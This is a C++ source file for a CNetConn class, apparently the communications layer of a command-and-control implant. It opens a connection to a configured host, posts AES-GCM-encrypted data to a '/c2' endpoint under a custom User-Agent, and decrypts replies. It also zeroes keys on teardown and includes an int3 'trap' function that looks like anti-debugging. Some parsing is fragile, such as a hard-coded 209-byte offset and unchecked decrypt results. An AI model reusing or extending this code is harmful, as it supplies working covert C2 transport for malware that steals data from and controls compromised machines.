#include "Public/Header/NetConn.h"
#include "Private/Header/Util.h"
#include "Public/Header/WatchInterface.h"
#include <cstring>
#include <algorithm>

#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>

CNetConn::CNetConn(std::string strHost, uint16_t uPort)
{
    m_vImmediateBuffer.resize(4096);
    m_strHost = strHost;
    m_uPort = uPort;

    std::string request;
    request = "POST http://" + strHost + ":" + std::to_string(uPort) + "/c2 HTTP/1.1" + "\n";
    request += "HOST: " + strHost + ":" + std::to_string(uPort) + "\n";
    request += "User-Agent: flog:GreenHerring\n";

    m_vRequestBuffer.resize(request.size());
    memcpy(m_vRequestBuffer.data(), request.data(), m_vRequestBuffer.size());

    // Open
    //m_bioServer = BIO_new_connect(strHost + ":" + std::to_string(uPort));

    auto bioMethod = BIO_s_connect();
    m_bioServer = BIO_new(bioMethod);
    
    BIO_set_conn_hostname(m_bioServer, strHost.c_str());
    BIO_set_conn_port(m_bioServer, std::to_string(uPort).c_str());

    auto res = BIO_do_connect(m_bioServer);
    if(res != 1) 
    {
        BIO_free(m_bioServer);
        throw std::exception();
    }
}

void CNetConn::Reconnect()
{
    auto bioMethod = BIO_s_connect();
    m_bioServer = BIO_new(bioMethod);
    
    BIO_set_conn_hostname(m_bioServer, m_strHost.c_str());
    BIO_set_conn_port(m_bioServer, std::to_string(m_uPort).c_str());

    auto res = BIO_do_connect(m_bioServer);
    if(res != 1) 
    {
        BIO_free(m_bioServer);
        throw std::exception();
    }
}

CNetConn::~CNetConn()
{
    Destroy(); // Kill Keys
    BIO_free(m_bioServer);
}
    
// "Negiotiate"
void CNetConn::SetKey(std::vector<char> &&vKey)
{
    m_vKey = std::move(vKey);
}

uint32_t CNetConn::INTERNAL_Decrypt(std::vector<char> &vBuffer)
{
    // Pointers hehe
    auto ivPtr = vBuffer.data();
    auto dataPtr = vBuffer.data() + 16;
    auto dataLen = vBuffer.size() - 32;
    auto tagPtr = vBuffer.data() + 16 + dataLen;

    int32_t writeLength;

    std::vector<char> vPlain;
    vPlain.resize(dataLen);

    EVP_CIPHER_CTX *cypherContext = EVP_CIPHER_CTX_new();
    if(!cypherContext) { return 1; }

    auto resi = EVP_DecryptInit_ex(cypherContext, EVP_aes_128_gcm(), 0, 0, 0);
    if (resi != 1) {return 2;}

    // 128b IV
    resi = EVP_CIPHER_CTX_ctrl(cypherContext, EVP_CTRL_GCM_SET_IVLEN, 16, 0);
    if (resi != 1) {return 3;}

    resi = EVP_DecryptInit_ex(cypherContext, NULL, NULL,
        reinterpret_cast<uint8_t*>(m_vKey.data()),
        reinterpret_cast<uint8_t*>(ivPtr)
        );

    if(!resi) { return 4;}

    resi = EVP_DecryptUpdate(cypherContext, 
        reinterpret_cast<uint8_t*>(vPlain.data()),
        &writeLength,
        reinterpret_cast<uint8_t*>(dataPtr),
        dataLen
        );
    if(!resi) { return 5; }


    resi = EVP_CIPHER_CTX_ctrl(cypherContext, 
        EVP_CTRL_GCM_SET_TAG, 16, tagPtr
    );
    if(!resi) { return 6; }


    resi = EVP_DecryptFinal_ex(cypherContext, reinterpret_cast<uint8_t*>(vPlain.data()) + writeLength, &writeLength);
    if(resi <= 0) { return 7; }

    // Text is good
    std::swap(vBuffer, vPlain);

    EVP_CIPHER_CTX_free(cypherContext);

    return 0;
}

uint32_t CNetConn::INTERNAL_Encrypt(std::vector<char> &vBuffer)
{
    int32_t writeLength;
    int cypherOffset = 0;

    auto blockSize = EVP_CIPHER_block_size(EVP_aes_128_gcm());

    uint32_t nBlocks = ((vBuffer.size() - 1) / blockSize) + 1;

    //printf("Debug nBlocks %d\n", nBlocks);

    // CypherText Holder
    std::vector<char> cyphertext;
    cyphertext.resize((nBlocks * blockSize) + 32);

    EVP_CIPHER_CTX *cypherContext = EVP_CIPHER_CTX_new();
    if(!cypherContext) { return 1; }

    // Don't init with IV and Key, we'll use a 128b IV
    auto resi = EVP_EncryptInit_ex(cypherContext, EVP_aes_128_gcm(), 0, 0, 0);
    if (resi != 1) {return 2;}

    // 128b IV
    resi = EVP_CIPHER_CTX_ctrl(cypherContext, EVP_CTRL_GCM_SET_IVLEN, 16, 0);
    if (resi != 1) {return 3;}

    // Generate IV here!
    std::vector<unsigned char> iv;
    iv.resize(16);

    resi = RAND_bytes(iv.data(), iv.size());

    if (!resi)
    {
        // Second Chance - badly
        int rc = RAND_load_file("/dev/random", 32);
        resi = RAND_bytes(iv.data(), iv.size());

        if(!resi) { return 4;}
    }

    // Keys and IVs
    resi = EVP_EncryptInit_ex(cypherContext, NULL, NULL, 
        reinterpret_cast<uint8_t*>(m_vKey.data()),
        iv.data());
    if(!resi) { return 5;}

    // Copy IV to front
    memcpy(cyphertext.data() + cypherOffset, iv.data(), iv.size());
    cypherOffset += iv.size();

    resi = EVP_EncryptUpdate(
        cypherContext,
        reinterpret_cast<uint8_t*>(cyphertext.data()) + cypherOffset,
        &writeLength,
        reinterpret_cast<uint8_t*>(vBuffer.data()),
        vBuffer.size()
        );
    if(!resi) {return 6;}

    cypherOffset += writeLength;

    resi = EVP_EncryptFinal_ex(
        cypherContext,
        reinterpret_cast<uint8_t*>(cyphertext.data()) + cypherOffset,
        &writeLength
    );

    if(!resi) {return 7;}

    cypherOffset += writeLength;

    resi = EVP_CIPHER_CTX_ctrl(
        cypherContext,
        EVP_CTRL_GCM_GET_TAG,
        16,
        reinterpret_cast<uint8_t*>(cyphertext.data()) + cypherOffset
        );

    cypherOffset += 16;

    // Flip Buffers
    std::swap(vBuffer, cyphertext);

    EVP_CIPHER_CTX_free(cypherContext);

    return 0;
}

/**
 * Send(buf)
 */
void CNetConn::Send(const FNetTxHeader &stHeader, const std::vector<char> &vBuffer)
{
    m_pWatchdog->Ack();
    // Prepend the header then encrypt Data with the key
    std::vector<char> encBody;
    encBody.resize(sizeof(stHeader) + vBuffer.size());

    memcpy(encBody.data(), &stHeader, sizeof(stHeader));
    memcpy(encBody.data() + sizeof(stHeader), vBuffer.data(), vBuffer.size());
    
    auto r = INTERNAL_Encrypt(encBody);
    //printf("%d\n", r);
    // Build HTTP GET Request
    
    // Combine Harvester
    std::string dynamicInfo;
    dynamicInfo += "Content-Length: ";
    dynamicInfo += std::to_string(encBody.size());
    dynamicInfo += "\n\n";

    std::vector<char> combBody;
    combBody.resize(encBody.size() + m_vRequestBuffer.size() + dynamicInfo.size());
    memcpy(combBody.data(), m_vRequestBuffer.data(), m_vRequestBuffer.size());
    memcpy(combBody.data() + m_vRequestBuffer.size(), dynamicInfo.data(), dynamicInfo.size());
    memcpy(combBody.data() + m_vRequestBuffer.size() + dynamicInfo.size(), encBody.data(), encBody.size());

    // Loop
    int64_t remaining = combBody.size();
    while(remaining > 0)
    {
        auto ptr = combBody.data() + combBody.size() - remaining;
        auto bytesSent = BIO_write(m_bioServer, ptr, remaining);

        remaining -= bytesSent;
    }

    m_pWatchdog->Ack();

    // Use AES_128_GCM
    //printf("%s\n", combBody.data());
}

void CNetConn::Recv(std::vector<char> &vBuffer)
{
    //ackl
    m_pWatchdog->Ack();

    auto recvBytes = 0;
    auto recvOffset = 0;

    // slightly less VERY hacky
    for(uint32_t i = 0; i < 3; ++i)
    {
        recvBytes = BIO_read(m_bioServer, m_vImmediateBuffer.data() + recvOffset, m_vImmediateBuffer.size() - recvOffset);

        // Copy
        recvOffset += recvBytes;

        //printf("Sum: %d\n", recvOffset);
    }

    //printf("RAW: %s\n", m_vImmediateBuffer.data());

    // immediateBuffer has everything we need
    // Find location of \n
    auto location = std::find(
            m_vImmediateBuffer.begin() + 209,
            m_vImmediateBuffer.begin() + recvOffset,
            char('\n')
        );
    if(location == m_vImmediateBuffer.begin() + recvOffset)
    {
        // Maybe we got some exception data 0.-
        return;
    }

    auto vBufOffset = std::distance(m_vImmediateBuffer.begin(), location + 1); // There are actually two \n's


    vBuffer.resize(recvOffset - vBufOffset);
    //memset(vBuffer.data(), 0, vBuffer.size())
    memcpy(vBuffer.data(), m_vImmediateBuffer.data() + vBufOffset, recvOffset - vBufOffset);

    auto r = INTERNAL_Decrypt(vBuffer);
    //printf("%d\n", r);

    m_pWatchdog->Ack();

    return;

    // do
    // {
    //     recvBytes = BIO_read(m_bioServer, m_vImmediateBuffer.data(), m_vImmediateBuffer.size());

    //     // Copy
    //     vBuffer.resize(recvOffset + recvBytes);
    //     memcpy(vBuffer.data() + recvOffset, m_vImmediateBuffer.data(), recvBytes);
    //     recvOffset += recvBytes;

    //     printf("%d\n", recvBytes);
    //     printf("%s\n", m_vImmediateBuffer.data());

    // } while(recvBytes > 0);//== m_vImmediateBuffer.size());



    // int64_t remaining = combBody.size();
    // while(remaining > 0)
    // {
    //     auto ptr = combBody.data() + combBody.size() - remaining;
    //     auto bytesSent = BIO_write(m_bioServer, ptr, remaining);

    //     remaining -= bytesSent;
    // }

}

// Watchable
void CNetConn::Destroy()
{
    // Destroy the key.
    volatile char* key = m_vKey.data();

    std::fill(key, key + m_vKey.size(), 0);
}

void CNetConn::Trap()
{
    // This is a trap function, it does odd things!
    ASM("int3");
}

uint32_t CNetConn::GetKeyPart()
{
    return 0x495e27ba;
}